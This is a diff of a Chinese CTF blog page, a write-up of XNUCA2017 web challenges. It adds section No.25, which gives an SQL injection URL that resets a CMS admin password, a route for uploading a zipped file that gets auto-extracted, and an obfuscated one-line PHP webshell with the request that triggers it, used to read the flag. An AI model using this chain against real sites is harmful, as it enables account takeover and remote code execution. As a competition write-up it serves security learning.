@@ -102,7 +102,7 @@
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/7.png?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/8.png?raw=true">
 <meta property="og:image" content="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170825/11.png?raw=true">
-<meta property="og:updated_time" content="2017-08-26T16:45:39.441Z">
+<meta property="og:updated_time" content="2017-08-28T10:49:51.974Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XNUCA2017-第一期：Web-writeup">
 <meta name="twitter:description" content="XNUCA2017-第一期：Web-writeup 难度中等偏下
@@ -471,6 +471,15 @@
 <p>flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">xnuca&#123;24567gtfvretyasdsgrtyjyufdgrth23&#125;</div></pre></td></tr></table></figure></p>
 <h1 id="No-24-可爱的星星"><a href="#No-24-可爱的星星" class="headerlink" title="No.24 可爱的星星"></a>No.24 可爱的星星</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">37af3efae1d906343d29b6b1a96fcd54.xnuca.cn</div><div class="line"></div><div class="line">请在目标入口/writeHere/目录下创建名为00111e86d51fa2b62add879572a0d29e的文件</div></pre></td></tr></table></figure>
 <p>没做出来。</p>
+<h1 id="No-25-愉快的玩耍吧"><a href="#No-25-愉快的玩耍吧" class="headerlink" title="No.25 愉快的玩耍吧"></a>No.25 愉快的玩耍吧</h1><p>重置Admin密码为1234567：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/login/login_check.php?met_cookie_filter[a]=a%27,admin_pass=md5(1234567)+where+id=1;+%23--</div></pre></td></tr></table></figure>
+<p>登录，并上传一个压缩了一句话php文件的压缩包到以下地址，会自动解压</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/admin/include/uploadify.php?type=skin&amp;wate=undefined&amp;module=undefined&amp;lang=cn</div></pre></td></tr></table></figure>
+<p>插入一句话的代码是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $e = $_REQUEST[<span class="string">'e'</span>]; $arr = <span class="keyword">array</span>($_REQUEST[<span class="string">'pass'</span>],); array_filter($arr, base64_decode($e)); <span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>用以下地址得到shell：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/templates/test.php?e=YXNzZXJ0</div></pre></td></tr></table></figure>
+<p>然后读取/etc/flag.txt，并写入文件即可。</p>
 <h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>吐槽点：</p>
 <ul>
 <li>比赛服务器：）</li>
@@ -492,7 +501,7 @@
   <p><span>本文标题:</span><a href="/2017/08/26/XNUCA2017-第一期：Web-writeup/">XNUCA2017-第一期：Web-writeup</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 chybeta 的个人博客">chybeta</a></p>
   <p><span>发布时间:</span>2017年08月26日 - 08:08</p>
-  <p><span>最后更新:</span>2017年08月27日 - 00:08</p>
+  <p><span>最后更新:</span>2017年08月28日 - 18:08</p>
   <p><span>原始链接:</span><a href="/2017/08/26/XNUCA2017-第一期：Web-writeup/" title="XNUCA2017-第一期：Web-writeup">http://yoursite.com/2017/08/26/XNUCA2017-第一期：Web-writeup/</a>
     <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://yoursite.com/2017/08/26/XNUCA2017-第一期：Web-writeup/"  aria-label="复制成功！"></i></span>
   </p>
@@ -574,8 +583,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/3017/06/19/ACM-OJ-长期更新/" rel="prev" title="ACM-OJ[长期更新]">
-                ACM-OJ[长期更新] <i class="fa fa-chevron-right"></i>
+              <a href="/2017/08/27/HackCon2017-Web-writeup/" rel="prev" title="HackCon2017-Web-writeup">
+                HackCon2017-Web-writeup <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -648,7 +657,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">104</span>
+                <span class="site-state-item-count">108</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -754,7 +763,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#No-1-你喜欢颜文字么"><span class="nav-number">1.</span> <span class="nav-text">No.1 你喜欢颜文字么</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-2-让你无语的md5"><span class="nav-number">2.</span> <span class="nav-text">No.2 让你无语的md5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-3-Pav1和lloowweerr…"><span class="nav-number">3.</span> <span class="nav-text">No.3 Pav1和lloowweerr…</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-4-X-NUCA-2017’s-S…"><span class="nav-number">4.</span> <span class="nav-text">No.4 X-NUCA 2017’s S…</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-5-Lucky-Number-Ca…"><span class="nav-number">5.</span> <span class="nav-text">No.5 Lucky Number Ca…</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-6-Hello-World"><span class="nav-number">6.</span> <span class="nav-text">No.6 Hello World</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-8-看视频真嗨皮"><span class="nav-number">7.</span> <span class="nav-text">No.8 看视频真嗨皮</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-9-The-Best-Commun…"><span class="nav-number">8.</span> <span class="nav-text">No.9 The Best Commun…</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-11-两只小蜜蜂啊"><span class="nav-number">9.</span> <span class="nav-text">No.11 两只小蜜蜂啊</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-12-社工库"><span class="nav-number">10.</span> <span class="nav-text">No.12 社工库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-18-“开讲啦”"><span class="nav-number">11.</span> <span class="nav-text">No.18 “开讲啦”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-23-找入口"><span class="nav-number">12.</span> <span class="nav-text">No.23 找入口</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-24-可爱的星星"><span class="nav-number">13.</span> <span class="nav-text">No.24 可爱的星星</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#小结"><span class="nav-number">14.</span> <span class="nav-text">小结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#No-1-你喜欢颜文字么"><span class="nav-number">1.</span> <span class="nav-text">No.1 你喜欢颜文字么</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-2-让你无语的md5"><span class="nav-number">2.</span> <span class="nav-text">No.2 让你无语的md5</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-3-Pav1和lloowweerr…"><span class="nav-number">3.</span> <span class="nav-text">No.3 Pav1和lloowweerr…</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-4-X-NUCA-2017’s-S…"><span class="nav-number">4.</span> <span class="nav-text">No.4 X-NUCA 2017’s S…</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-5-Lucky-Number-Ca…"><span class="nav-number">5.</span> <span class="nav-text">No.5 Lucky Number Ca…</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-6-Hello-World"><span class="nav-number">6.</span> <span class="nav-text">No.6 Hello World</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-8-看视频真嗨皮"><span class="nav-number">7.</span> <span class="nav-text">No.8 看视频真嗨皮</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-9-The-Best-Commun…"><span class="nav-number">8.</span> <span class="nav-text">No.9 The Best Commun…</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-11-两只小蜜蜂啊"><span class="nav-number">9.</span> <span class="nav-text">No.11 两只小蜜蜂啊</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-12-社工库"><span class="nav-number">10.</span> <span class="nav-text">No.12 社工库</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-18-“开讲啦”"><span class="nav-number">11.</span> <span class="nav-text">No.18 “开讲啦”</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-23-找入口"><span class="nav-number">12.</span> <span class="nav-text">No.23 找入口</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-24-可爱的星星"><span class="nav-number">13.</span> <span class="nav-text">No.24 可爱的星星</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#No-25-愉快的玩耍吧"><span class="nav-number">14.</span> <span class="nav-text">No.25 愉快的玩耍吧</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#小结"><span class="nav-number">15.</span> <span class="nav-text">小结</span></a></li></ol></div>
             
 
           </div>
